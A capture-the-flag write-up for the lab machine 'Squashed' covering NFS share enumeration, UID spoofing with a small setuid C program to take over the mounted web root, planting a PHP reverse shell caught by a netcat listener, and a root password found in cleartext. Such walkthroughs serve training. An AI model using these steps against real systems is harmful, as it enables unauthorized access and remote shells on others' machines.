# Squashed

Date Released: 10th November 2022

Date Completed: 11th November 2022

I always start by setting the environment variable `$IP` to the IP of the target box, it's just for my own convenience.
```console
$ export IP=10.10.11.191
```
Added 'squashed.htb' to /etc/hosts

Initial Recon
```console
$ nmap -sC -sV -T4 -A $IP -vv -oN nmap/usual

[REDACTED]
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
111/tcp  open  rpcbind syn-ack 2-4 (RPC #100000)
2049/tcp open  nfs_acl syn-ack 3 (RPC #100227)
```

Full Port Scan
```console
$ sudo nmap -sS -T5 -n -p- $IP -vv -oN nmap/full

22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
2049/tcp  open  nfs     syn-ack ttl 63
34647/tcp open  unknown syn-ack ttl 63
38715/tcp open  unknown syn-ack ttl 63
54971/tcp open  unknown syn-ack ttl 63
56565/tcp open  unknown syn-ack ttl 63
```
Yes there are other ports open as well...

There's a Network File System (NFS) running on the box, I proceed to check for shared directories.
```console
$ showmount -e $IP

[REDACTED]
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

Then I mount those shares to my box
```console
$ mkdir nfs
$ mkdir nfs/ross
$ mkdir nfs/html
$ sudo mount -t nfs $IP:/home/ross nfs/ross
$ sudo mount -t nfs $IP:/var/www/html nfs/html
$ cd  nfs/
```

Now in my `nfs/` directory:
```
.
├── html      <-- Cant read here
└── ross
    ├── Desktop
    ├── Documents
    │	└── Passwords.kdbx
    ├── Downloads
    ├── Music
    ├── Pictures
    ├── Public
    ├── Templates
    └── Videos
```

Im unable to read content of `html/` even with root.
```console
$ ls -l html 

ls: cannot access 'html/index.html': Permission denied
ls: cannot access 'html/images': Permission denied
ls: cannot access 'html/css': Permission denied
ls: cannot access 'html/js': Permission denied
total 0
?????????? ? ? ? ?            ? css
?????????? ? ? ? ?            ? images
?????????? ? ? ? ?            ? index.html
?????????? ? ? ? ?            ? js
```

So I proceed to explore in `ross/`.

There's a bunch of files in it. One file that brought to my attention is `ross/Documents/Passwords.kdbx`.

```console
$ file ross/Documents/Passwords.kdbx 

ross/Documents/Passwords.kdbx: Keepass password database 2.x KDBX
```

There's an utility called `keepass2john` where we can convert keepass databases into a john-readable format. But I got the following error message when I execute it:
```console
$ keepass2john ross/Documents/Passwords.kdbx > forjohn

! nfs/ross/Documents/Passwords.kdbx : File version '40000' is currently not supported!
```

I searched for it on google and it seems that JohnTheRipper currently does not support this version of Keepass databases.

My next idea was to write SSH keys to `ross/`, but the directory is **Read-Only**.

So I continue to search for useful information in `ross/`. I viewed almost every file in the directory, and in `ross/.local/share/recently-used.xbel`, i saw a path to the keyfile:
```
file:///usr/share/keepassxc/keyfiles/ross/keyfile.key
```

I wasn't able to read it, so I kept that in mind.

No luck in `ross/`, so I went to play around with `html/`

Back to the question, why are we not able to read the `html/` directory?

If we view the **id** permissions of the directories:
```console
$ ls -ln 

drwxr-xr--  5 2017   33 4096 Nov 11 00:40 html
drwxr-xr-x 14 1001 1001 4096 Nov 10 22:03 ross
```

For `html/`, we can see that the **uid** is `2017`, and the **gid** is `33`.

In order to take control of `html/`, we have to change it's permission using the **uid of the owner**, which is `2017`.

```
drwxr-xr--  5 2017   33 4096 Nov 11 00:40 html
               ^
             Here!
```

I've written a script in C, `test.c`:
```c
#include <stdio.h>
#include <unistd.h>

int main(){ 
	setuid(2017); //Setting the UID
	system("id"); //Verifying our UID
	system("chmod 777 html/"); //Change the permissions of 'html/'
	system("ls -ln"); //Verify the permissions of 'html/' after modifying
	return 0;
}
```

We then compile it:
```console
gcc test.c -o test
```

Executing the program (must run with sudo):
```console
$ sudo ./test                                                                              
uid=2017(squashed) gid=0(root) groups=0(root)
total 24
drwxrwxrwx  5 2017   33  4096 Nov 11 00:50 html
drwxr-xr-x 14 1001 1001  4096 Nov 10 22:03 ross
-rwxr-xr-x  1 1001 1001 16008 Nov 11 00:52 test
```

Now we can see that the `html/` directory has been compromised.

```console
$ cd html/
$ ls -la

total 56
drwxrwxrwx 5  2017 www-data  4096 Nov 11 00:55 .
drwxr-xr-x 4 ryz3n ryz3n     4096 Nov 11 00:52 ..
drwxr-xr-x 2  2017 www-data  4096 Nov 11 00:55 css
-rw-r--r-- 1  2017 www-data    44 Oct 21 06:30 .htaccess
drwxr-xr-x 2  2017 www-data  4096 Nov 11 00:55 images
-rw-r----- 1  2017 www-data 32532 Nov 11 00:55 index.html
drwxr-xr-x 2  2017 www-data  4096 Nov 11 00:55 js
```

In `.htaccess`, I saw that:
```console
$ cat .htaccess                                                                            
AddType application/x-httpd-php .htm .html
```
It means that this web server can run **PHP**.

So I grabbed a PHP reverse shell from [revshells.com](https://revshells.com/), and copied it to `html/shell.php`.

Next, I setup my netcat listener
```console
$ nc -lnvp 9999
```

Then I navigate to `http://squashed.htb/shell.php`, and I got a shell!

```console
$ nc -lnvp 9999                                                                            
listening on [any] 9999 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.191] 44896
Linux squashed.htb 5.4.0-131-generic #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 06:00:44 up  2:57,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               03:03    2:57m 15.82s  0.05s /usr/libexec/gnome-session-binary --systemd --session=gnome
uid=2017(alex) gid=2017(alex) groups=2017(alex)
sh: 0: can't access tty; job control turned off
$ 
$ bash -i
alex@squashed:~$ 
```

### We are in as `alex@squashed`!

The **user flag** is at `/home/alex/user.txt`.

I chose to stabilize the shell by generating SSH keys for `alex`. You can learn how to do it [here](../Tips%26Tricks/Generating%20SSH%20Keys.md)

You'll definitely regret if you came here to find for the **root flag**. Try finding it yourself before you continue to read.

.

.

.

The credentials of `root` is actually shown in cleartext in `/home/ross/.local/share/tracker/data/tracker-store.journal`. You just need some patient to find it out.

To be honest, I wasn't expecting to escalate to `root` immediately. I was thinking maybe I need to perform **horizontal escalation** to `ross`, and then somehow use his keyfile at `/usr/share/keepassxc/keyfiles/ross/keyfile.key` to unlock `/home/ross/Documents/Passwords.kdbx`, then I'll probably get the credentials of `root` at that step.

The credentials of `root` is:
```
root:cah$mei7rai9A
```

So I authenticated as `root` to get the **root flag**.
```console
su root

Password:
root@squashed:~#
```

The **root flag** is at `/root/root.txt`.

## Additional Stuffs

Here are some things that I've explored after obtaining a `root` shell.

### Unable to read `html/` 
The reason why I wasn't able to read the `html/` directory after mounting is because of the configuration set in `/etc/exports`:
```
/var/www/html *(rw,sync,root_squash)
/home/ross *(sync,root_squash)     <-- Here!
```
The `/home/ross` NFS directory was not given the `rw` flag. Hence, it is not writable. You can learn more about NFS configurations [here](https://www.thegeekdiary.com/basic-nfs-security-nfs-no_root_squash-and-suid/).

### Others

The other ports open are just rabbit holes!!

It was a fun & easy box. Hope you all enjoyed it too!
